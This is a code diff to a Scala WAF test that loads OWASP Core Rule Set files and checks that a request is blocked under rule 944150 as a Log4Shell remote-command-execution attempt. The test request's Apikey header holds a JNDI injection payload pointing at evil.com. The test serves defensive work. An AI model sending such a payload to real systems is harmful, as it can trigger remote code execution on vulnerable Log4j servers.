@@ -75,7 +75,9 @@ class SecLangBasicTest extends munit.FunSuite {
       }.toMap*/
 
     println("fetching CRS ...")
-    val rules = List(
+    val rules = (Seq(
+      "https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/crs-setup.conf.example"
+    ) ++ (List(
       "REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example",
       "REQUEST-901-INITIALIZATION.conf",
       "REQUEST-905-COMMON-EXCEPTIONS.conf",
@@ -105,7 +107,7 @@ class SecLangBasicTest extends munit.FunSuite {
       "RESPONSE-980-CORRELATION.conf",
       "RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example",
     )
-      .map(v => s"https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/rules/${v}")
+      .map(v => s"https://raw.githubusercontent.com/coreruleset/coreruleset/refs/heads/main/rules/${v}")))
       .map { url =>
         println(s"fetching: ${url} ...")
         val request = HttpRequest.newBuilder()
@@ -135,14 +137,15 @@ class SecLangBasicTest extends munit.FunSuite {
           method = "GET",
           uri = "/",
           headers = Map(
+            "Host" -> List("www.foo.bar"),
             "Apikey" -> List("${jndi:ldap://evil.com/a}"),
-            //"User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
+            "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
           ),
           query = Map("q" -> List("test")),
           body = None
         )
         val failing_res = engine.evaluate(failing_ctx, phases = List(1, 2)).displayPrintln()
-        assertEquals(failing_res.disposition, Block(403, None, None))
+        assertEquals(failing_res.disposition, Block(403, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
       }
     }
   }
